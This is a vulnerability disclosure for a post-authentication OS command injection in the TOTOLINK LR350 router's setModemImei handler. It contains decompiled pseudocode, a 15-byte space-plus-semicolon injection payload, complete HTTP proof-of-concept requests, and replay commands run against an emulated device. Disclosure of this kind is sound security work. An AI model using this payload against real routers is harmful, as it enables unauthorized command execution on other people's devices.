## LR350 Vulnerability

Vendor:TOTOLINK

Product:LR350

Version:V9.3.5u (intl. V1_VN build, cstecgi string `V9.3.5u`, public CVEs reference build V9.3.5u.6369_B20220309)

Download:https://www.totolink.net → LR350 → `LR350-V1-BAN-VA-LOI-404_V1.0_EN.web` (sha256 01aa5f96155c705e8a5bcab3f882020b32e1becd97911f2f286c77303d43fafb)

Vulnerability:OS Command Injection via `imei` parameter of `setModemImei` (post-auth) — CWE-78

Author:Chauncy-lab

## Descriptions

We found a command injection vulnerability in `/www/cgi-bin/cstecgi.cgi` (lighttpd 1.4.20 + mod_cgi, MIPS/uClibc) of TOTOLINK LR350.

Requests are JSON POSTs dispatched by `topicurl`. Handlers outside a small no-auth whitelist require a 32-byte session token stored in `/tmp/cookie_key` — `setModemImei` is **not** whitelisted, so the handler is reachable post-auth (`main` @ 0x42cb30, IDA 9.1 pseudocode):

```c
Var = websGetVar(v18, "topicurl", &byte_4337C0);      // handler name from JSON
v21 = (_BYTE *)websGetVar(v17, "token", &byte_4337C0);  // token from JSON or ?token=
...
if ( !strcmp(Var, "getInitCfg")                       // no-auth whitelist:
  || !strcmp(Var, "getLoginCfg")
  || !strcmp(Var, "loginAuth")
  || !strcmp(Var, "UploadCustomModule")
  || !strcmp(Var, "getSysStatusCfg")
  || !strcmp(Var, "getCrpcCfg")
  || !strcmp(Var, "getCrpcConfig")
  || !strcmp(Var, "getLteAllInfo")
  || !strcmp(Var, "setLanguageCfg") )
{
  v27 = 1;                                            // whitelisted -> no token needed
}
else
{
  v24 = 0;
  if ( f_exists("/tmp/cookie_key") )                  // <-- session token file
  {
    f_read("/tmp/cookie_key", v43, 128);
    memset(v41, 0, sizeof(v41));
    f_read("/tmp/token_uptime", v41, 128);
    v24 = strtol(v41, 0, 10);
  }
  v25 = time(0);
  if ( strlen(v43) != 32 )                            // <-- must be the 32-byte key
    goto LABEL_53;
  n301 = v25 - v24;
  if ( v24 && n301 >= 301 )                           // +300 s freshness
  {
    system("rm -f /tmp/cookie_key");
    sub_42C9E0(-4, "Login timeout");
    goto LABEL_84;
  }
  if ( !*v21 || strcmp(v21, v43) )                    // <-- request token must match
  {
LABEL_53:
    sub_42C9E0(-1, "token invalid");
LABEL_84:
    cJSON_Delete(v17);
    ...
    return 0;
  }
```

In the `setModemImei` handler (`sub_41BFD8`, IDA 9.1 pseudocode), the user-controlled `imei` value passes a `strlen == 15` gate and is concatenated into an AT-command template which is then executed with `system()`:

```c
int __fastcall sub_41BFD8(int a1)
{
  const char *Var; // $s0
  int v3; // $v0
  _BYTE v5[132]; // [sp+18h] [-84h] BYREF

  memset(v5, 0, 128);
  Var = (const char *)websGetVar(a1, "imei", &byte_4337C0);   // user JSON, zero filtering
  if ( strlen(Var) == 15 )                                    // <-- 15-byte gate (masks the sink)
  {
    v3 = nvram_safe_get("modem_name");
    if ( strstr(v3, " EC200A") )
    {
      sub_41BF08(Var);
      setDefResponse("70", "reserv");
      doSystem("lktos_reload %s", "reboot");
      return 1;
    }
    sprintf(v5, "cli_atc at+EGMR=1,7,\\\"%s\\\" ", Var);       // <-- imei into shell command
    system(v5);                                               // <-- /bin/sh -c execution
    set_wan_unit_value_temp(1, "imei", Var);
  }
  setResponse(&word_431D78, "reserv");
  return 1;
}
```

Two details make this sink easy to miss in fuzzing:

1. the `strlen(imei) == 15` constraint silently discards every conventional injection payload;
2. the C template `"cli_atc at+EGMR=1,7,\\\"%s\\\" "` compiles to a *literal backslash+quote* at runtime, so injected quotes are absorbed into the quoted string.

The working breakout uses **space + semicolon** word-splitting inside the 15-byte budget: `imei = "ab ;ls>/www/lst"` makes `/bin/sh -c` run `… at+EGMR=1,7,\"ab` and then `ls>/www/lst\"` — writing the output of `ls` into an attacker-named file `lst"` inside the web root, which is retrievable over HTTP (`GET /lst%22` → 200).

Suggested CVSS v3.1: `AV:A/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` (8.0, arbitrary command execution with router privileges).

No corresponding CVE exists: NVD keyword search over all 33 `TOTOLINK LR350` entries, `setModemImei`, and `TOTOLINK modem imei` returns no match; the closest entry CVE-2023-37148 is the `ussd` parameter of `setUssd` — a different handler and parameter.

## Proof of Concept (PoC) — verbatim replay capture (2026-11-13)

Control write (legitimate 15-digit IMEI) and attack — exact bytes on the wire. Both requests are 217 bytes with 52-byte bodies; they differ **only** in the 15-byte `imei` value.

**Request — control, legitimate IMEI (217 bytes):**

```text
POST /cgi-bin/cstecgi.cgi?token=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA HTTP/1.1
Host: 127.0.0.1
Connection: close
Content-Type: application/json
Content-Length: 52

{"topicurl":"setModemImei","imei":"123456789012345"}
```

**Response (227 bytes; lighttpd 1.4.20 answers `Transfer-Encoding: chunked` — `58` is the hex chunk length, `0` terminates the body):**

```text
HTTP/1.1 200 OK
Connection: close
Transfer-Encoding: chunked
Date: Fri, 13 Nov 2026 06:01:59 GMT
Server: lighttpd/1.4.20

58
{
	"success":	true,
	"error":	null,
	"lan_ip":	"",
	"wtime":	"0",
	"reserv":	"reserv"
}

0
```

**Request — attack, `imei` = `ab ;ls>/www/lst` (217 bytes):**

```text
POST /cgi-bin/cstecgi.cgi?token=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA HTTP/1.1
Host: 127.0.0.1
Connection: close
Content-Type: application/json
Content-Length: 52

{"topicurl":"setModemImei","imei":"ab ;ls>/www/lst"}
```

**Response (227 bytes — identical to the control):**

```text
HTTP/1.1 200 OK
Connection: close
Transfer-Encoding: chunked
Date: Fri, 13 Nov 2026 06:01:59 GMT
Server: lighttpd/1.4.20

58
{
	"success":	true,
	"error":	null,
	"lan_ip":	"",
	"wtime":	"0",
	"reserv":	"reserv"
}

0
```

`system()` executes `/bin/sh -c "cli_atc at+EGMR=1,7,\"ab ;ls>/www/lst\" "` — the space+semicolon split the template word, so `ls>/www/lst"` runs as a second command.

## Overcome

Fresh full replay on 2026-11-13 against the emulation container `verify_0145_lr350` (stock lighttpd + `cstecgi.cgi` under qemu-user, seeded 32-byte session token, port 8145; container clock is UTC). Each step lists the **executed command(s)** and their **verbatim output** in separate blocks.

**Step 1 — artifact deleted before the run; `GET /lst%22` does not exist yet**

Command:

```sh
docker exec verify_0145_lr350 sh -c 'rm -f "/qemu_arm/rootfs/www/lst\"" ; ls /qemu_arm/rootfs/www/lst* 2>&1'
curl -s -o /dev/null -w '%{http_code}\n' 'http://127.0.0.1:8145/lst%22'
```

Output (in command order):

```text
ls: cannot access '/qemu_arm/rootfs/www/lst*': No such file or directory
404
```

(Both lines are the **intended** result of this check: the artifact does not exist on disk (`ls` finds nothing) nor on the web server (`404` = Not Found). This is the "before" picture — contrast it with Step 3, where the same request returns `200` with the injected `ls` output.)

**Step 2 — send the control and attack requests shown in the PoC section above** (both answered `HTTP/1.1 200 OK` with identical bodies).

**Step 3 — effect: the file written by the injected `ls` is served from the web root**

Command:

```sh
curl -s -o /dev/null -w '%{http_code}\n' 'http://127.0.0.1:8145/lst%22'
curl -s 'http://127.0.0.1:8145/lst%22'
docker exec verify_0145_lr350 sh -c 'ls -la /qemu_arm/rootfs/www/ | grep lst'
```

Output (in command order):

```text
200
ExportSettings.sh
cstecgi.cgi
cstecgi.cgi.orig
qemu_cstecgi.cgi_20261031-142343_124.core
-rw-r--r--  1 root root    89 Nov 13 06:01 lst"
```

(HTTP 200, then the 89-byte directory listing of the web root exactly as the injected `ls` wrote it; the final line is the file itself — created `Nov 13 06:01` by the attack request, owned by root.)

`qemu -strace` of an earlier run (equivalent 15-byte marker payload `ab ;echo>/www/r`)
additionally captured the decisive syscall:
`execve("/bin/sh", {"/bin/sh","-c","cli_atc at+EGMR=1,7,\"ab ;echo>/www/r\" "}, NULL)`.

Note on the token: in this emulation the 32-byte session key is pre-seeded
(`/tmp/cookie_key` = `A`×32, hence `?token=AAAA…`); on a real device log in with the
admin credentials and use the `token` value the web UI itself appends to its
`cstecgi.cgi` requests (the same 32-byte value is held in `/tmp/cookie_key`) — any
non-matching token is rejected by the `token invalid` branch shown above.
